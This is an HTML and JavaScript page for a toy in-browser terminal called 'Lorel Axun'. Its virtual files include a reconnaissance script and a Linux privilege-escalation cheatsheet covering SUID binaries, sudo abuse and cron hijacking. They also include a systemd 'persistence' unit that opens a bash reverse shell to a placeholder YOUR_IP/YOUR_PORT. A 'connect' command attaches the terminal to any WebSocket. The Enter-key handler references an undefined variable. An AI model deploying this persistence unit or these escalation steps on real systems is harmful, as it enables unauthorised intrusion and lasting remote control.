<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Lorel Axun</title>\n    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css\" />\n    <style>\n        :root {\n            --bg: #1a1b26;\n            --fg: #c0caf5;\n            --black: #15161e;\n            --red: #f7768e;\n            --green: #9ece6a;\n            --yellow: #e0af68;\n            --blue: #7aa2f7;\n            --magenta: #bb9af7;\n            --cyan: #7dcfff;\n            --white: #a9b1d6;\n        }\n\n        body, html {\n            height: 100%;\n            margin: 0;\n            padding: 0;\n            background-color: var(--bg);\n            color: var(--fg);\n            font-family: 'Courier New', Courier, monospace;\n        }\n\n        #terminal-container {\n            width: 100%;\n            height: 100%;\n        }\n\n        #desktop {\n            width: 100%;\n            height: 100%;\n            background-size: cover;\n            background-position: center;\n            display: none;\n            position: relative;\n        }\n\n        #dock {\n            position: absolute;\n            bottom: 10px;\n            left: 50%;\n            transform: translateX(-50%);\n            background-color: rgba(0, 0, 0, 0.5);\n            border-radius: 12px;\n            padding: 8px;\n            display: flex;\n            gap: 10px;\n        }\n\n        #terminal-icon {\n            width: 50px;\n            height: 50px;\n            background-color: var(--black);\n            border: 2px solid var(--blue);\n            border-radius: 8px;\n            cursor: pointer;\n            display: flex;\n            align-items: center;\n            justify-content: center;\n            font-size: 24px;\n            color: var(--green);\n        }\n    </style>\n</head>\n<body>\n    <div id=\"terminal-container\"></div>\n    <div id=\"desktop\">\n        <div id=\"dock\">\n            <div id=\"terminal-icon\" title=\"Open Terminal\"> >_ </div>\n        </div>\n    </div>\n    <div id=\"editor\"></div>\n\n    <script src=\"https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/xterm-addon-attach@0.9.0/lib/xterm-addon-attach.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/figlet@1.7.0/lib/figlet.min.js\"></script>\n\n    <script>\n        const term = new Terminal({\n            cursorBlink: true,\n            theme: {\n                background: 'var(--bg)',\n                foreground: 'var(--fg)',\n                black: 'var(--black)',\n                red: 'var(--red)',\n                green: 'var(--green)',\n                yellow: 'var(--yellow)',\n                blue: 'var(--blue)',\n                magenta: 'var(--magenta)',\n                cyan: 'var(--cyan)',\n                white: 'var(--white)',\n            }\n        });\n\n        const fitAddon = new FitAddon.FitAddon();\n        term.loadAddon(fitAddon);\n        term.open(document.getElementById('terminal-container'));\n        fitAddon.fit();\n        window.addEventListener('resize', () => fitAddon.fit());\n\n        let vfs = {\n            '/bin/recon.sh': '#!/bin/bash\\n# Basic Linux Reconnaissance Script\\necho \"--- System Info ---\"\\nuname -a\\ncat /etc/os-release\\necho \"\\n--- User Info ---\"\\nwhoami\\nid\\nw\\necho \"\\n--- Network Info ---\"\\nip a\\nss -tuln',\n            '/etc/systemd/system/lorel.service': '[Unit]\\nDescription=Lorel Axun Persistence Service\\nAfter=network.target\\n\\n[Service]\\nType=simple\\nExecStart=/bin/bash -c \\\"bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1\\\"\\nRestart=on-failure\\n\\n[Install]\\nWantedBy=multi-user.target',\n            '/bin/privesc_cheatsheet.txt': `--- Linux Privilege Escalation Quick Reference ---\\n\\n1. Kernel Exploits:\\n   - Check kernel version: uname -a\\n   - Search for exploits matching the version (e.g., Dirty COW, Dirty Pipe).\\n   - Unreliable and can crash the system. Use as a last resort.\\n\\n2. SUID/GUID Binaries:\\n   - Find SUID files: find / -perm -u=s -type f 2>/dev/null\\n   - Exploit known vulnerable binaries (nmap, find, vim, etc.) to run commands as root.\\n   - Check GTFOBins for exploitation methods.\\n\\n3. Misconfigured Cron Jobs:\\n   - Check system-wide cron jobs: cat /etc/crontab\\n   - Look for scripts that are world-writable or run with high privileges.\\n   - Modify a writable script to execute a reverse shell.\\n\\n4. Sudo Rights Abuse:\\n   - Check user's sudo rights: sudo -l\\n   - Exploit \\\"(ALL) NOPASSWD: /path/to/binary\\\" entries.\\n   - If a binary can be run as root, check GTFOBins for how to spawn a root shell from it.\\n\\n5. Leaked Credentials:\\n   - Search config files, bash history (.bash_history), and logs for passwords.`\n        };\n        let env = {\n            'USER': 'guest',\n            'HOSTNAME': 'lorel-os',\n            'PWD': '/home/guest'\n        };\n\n        function saveState() {\n            localStorage.setItem('lorel_vfs', JSON.stringify(vfs));\n            localStorage.setItem('lorel_env', JSON.stringify(env));\n        }\n\n        function loadState() {\n            const savedVfs = localStorage.getItem('lorel_vfs');\n            const savedEnv = localStorage.getItem('lorel_env');\n            if (savedVfs) vfs = JSON.parse(savedVfs);\n            if (savedEnv) env = JSON.parse(savedEnv);\n        }\n\n        let currentLine = '';\n        let commandHistory = [];\n        let historyIndex = -1;\n\n        function showPrompt() {\n            term.write(`\\r\\n\\x1b[32m${env.USER}@${env.HOSTNAME}\\x1b[0m:\\x1b[34m${env.PWD}\\x1b[0m$ `);\n        }\n\n        function executeCommand(line) {\n            const [command, ...args] = line.trim().split(' ');\n            term.writeln('');\n            switch (command) {\n                case 'startx':\n                    document.getElementById('terminal-container').style.display = 'none';\n                    const desktop = document.getElementById('desktop');\n                    desktop.style.backgroundImage = `url('https://source.unsplash.com/random/1920x1080?sig=${Math.random()}')`;\n                    desktop.style.display = 'block';\n                    break;\n                case 'connect':\n                    if (args.length > 0) {\n                        try {\n                            const ws = new WebSocket(args[0]);\n                            const attachAddon = new AttachAddon.AttachAddon(ws);\n                            term.loadAddon(attachAddon);\n                            term.writeln(`\\x1b[32mConnecting to ${args[0]}...\\x1b[0m`);\n                        } catch (e) {\n                            term.writeln(`\\x1b[31mConnection error: ${e.message}\\x1b[0m`);\n                        }\n                    } else {\n                        term.writeln('\\x1b[31mUsage: connect <ws_url>\\x1b[0m');\n                    }\n                    break;\n                case 'showrecon':\n                    term.writeln(vfs['/bin/recon.sh']);\n                    break;\n                case 'show_persistence':\n                    term.writeln(vfs['/etc/systemd/system/lorel.service']);\n                    break;\n                case 'show_privesc':\n                    term.writeln(vfs['/bin/privesc_cheatsheet.txt'].trim());\n                    break;\n                case 'help':\n                    printWelcome();\n                    break;\n                case 'clear':\n                    term.clear();\n                    break;\n                case '':\n                    break;\n                default:\n                    term.writeln(`lorel-os: command not found: ${command}`);\n                    break;\n            }\n        }\n\n        term.onKey(({ key, domEvent }) => {\n            const printable = !domEvent.altKey && !domEvent.ctrlKey && !domEvent.metaKey;\n\n            if (domEvent.keyCode === 13) { // Enter\n                if (currentLine.trim() !== '') {\n                    commandHistory.push(currentLine);\n                }\n                historyIndex = commandHistory.length;\n                executeCommand(currentLine);\n                currentLine = '';\n                if (command !== 'connect') {\n                   showPrompt();\n                }\n            } else if (domEvent.keyCode === 8) { // Backspace\n                if (currentLine.length > 0) {\n                    term.write('\\b \\b');\n                    currentLine = currentLine.slice(0, -1);\n                }\n            } else if (printable) {\n                currentLine += key;\n                term.write(key);\n            }\n        });\n\n        function printWelcome() {\n            term.writeln('Welcome to Lorel OS.');\n            term.writeln('This is a simulated environment. Your actions here are contained.');\n            term.writeln('\\nAvailable commands:');\n            term.writeln('  - startx              : Start the graphical user interface.');\n            term.writeln('  - connect <ws_url>    : Connect to a remote WebSocket server for escape.');\n            term.writeln('  - showrecon           : Display the content of the reconnaissance script.');\n            term.writeln('  - show_persistence    : Display the systemd persistence payload.');\n            term.writeln('  - show_privesc        : Display a cheatsheet for Linux privilege escalation.');\n            term.writeln('  - help                : Show this help message.');\n            term.writeln('  - clear               : Clear the terminal screen.');\n        }\n\n        // Boot sequence\n        figlet.text('Lorel Axun', { font: 'Standard' }, (err, data) => {\n            if (err) {\n                term.writeln('Lorel Axun');\n            } else {\n                term.writeln(data);\n            }\n            printWelcome();\n            showPrompt();\n        });\n\n        document.getElementById('terminal-icon').addEventListener('click', () => {\n            document.getElementById('desktop').style.display = 'none';\n            document.getElementById('terminal-container').style.display = 'block';\n            term.focus();\n        });\n\n        loadState();\n    </script>\n</body>\n</html>